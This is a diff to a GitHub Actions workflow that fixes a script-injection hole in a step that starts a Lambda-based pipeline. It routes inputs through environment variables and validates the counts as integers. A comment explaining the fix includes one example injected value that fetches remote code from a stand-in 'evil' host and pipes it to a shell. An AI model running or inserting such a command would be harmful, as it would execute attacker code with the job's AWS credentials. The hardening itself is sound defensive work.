@@ -40,11 +40,22 @@ jobs:
           aws-region: us-east-1
 
       - name: Start pipeline
+        # Inputs come in through env, never interpolated into the script body: a `${{ }}`
+        # expansion happens before bash runs, so a note like `x"; curl evil | sh; echo "`
+        # would execute in this step -- which holds the assumed AWS role. jq reads them from
+        # the environment instead, and the counts are validated as integers first (2026-10-30
+        # security audit).
+        env:
+          TASK_COUNT: ${{ inputs.task_count }}
+          SAMPLE_COUNT: ${{ inputs.sample_count }}
+          NOTE: ${{ inputs.note }}
         run: |
+          case "$TASK_COUNT" in ''|*[!0-9]*) echo "task_count must be a positive integer"; exit 1;; esac
+          case "$SAMPLE_COUNT" in ''|*[!0-9]*) echo "sample_count must be a positive integer"; exit 1;; esac
           PAYLOAD=$(jq -n \
-            --arg tc "${{ inputs.task_count }}" \
-            --arg sc "${{ inputs.sample_count }}" \
-            --arg note "${{ inputs.note }}" \
+            --arg tc "$TASK_COUNT" \
+            --arg sc "$SAMPLE_COUNT" \
+            --arg note "$NOTE" \
             '{trigger_source: "github-actions",
               params: {task_count: ($tc|tonumber), sample_count: ($sc|tonumber), note: $note}}')
           OUT=$(aws lambda invoke --function-name llmops-start-pipeline \
